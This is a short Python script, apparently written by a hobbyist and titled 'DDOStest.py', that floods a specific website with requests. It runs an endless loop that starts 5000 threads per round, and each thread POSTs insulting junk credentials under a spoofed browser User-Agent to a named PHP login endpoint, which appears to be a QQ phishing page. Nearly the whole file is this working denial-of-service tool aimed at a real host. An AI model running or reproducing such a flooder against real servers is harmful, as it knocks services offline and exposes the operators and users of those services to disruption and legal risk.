# -*- coding:utf-8 -*-
# @Time : 2020/5/23 23:41
# @Author : AX
# @File : DDOStest.py
# @Software: PyCharm

import threading
import requests
import time
import requests.exceptions


def thread_job():
    # print("This is an added Thread,number is %s"%threading.current_thread())
    print("T1 Start")
    for i in range(10):
        time.sleep(0.1)
    print("T1 finish\n")


def main():
    # 增加一个线程（实例化一个线程对象）,用target进行run
    # added_thread = threading.Thread(target=thread_job(),name="T1")
    # 当前活跃线程数目
    # added_thread.start()
    try:
        # req = requests.get("https://xgpax.top/")
        data = {
            "u": "sbsbsbsbsbsb",
            "p": "nmsl",
            'bianhao':''
        }
        header ={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
        }
        req = requests.post(url="http://z30.672269.xyz/action/qq_yxdl/2019.php",headers = header,data=data)
        print(req)
        # print(threading.current_thread(), " done")
    except Exception as e:
        print(e)
    # print(threading.active_count())
    # 穷举当前线程
    # print(threading.enumerate())
    # 打印正在运行的线程
    # print(threading.current_thread())
    [].append()

if __name__ == '__main__':
    # main()
    while True:
        try:
            for i in range(5000):
                t = threading.Thread(target=main)
                t.start()
                t = None
            t.join()
        except Exception as e:
            pass
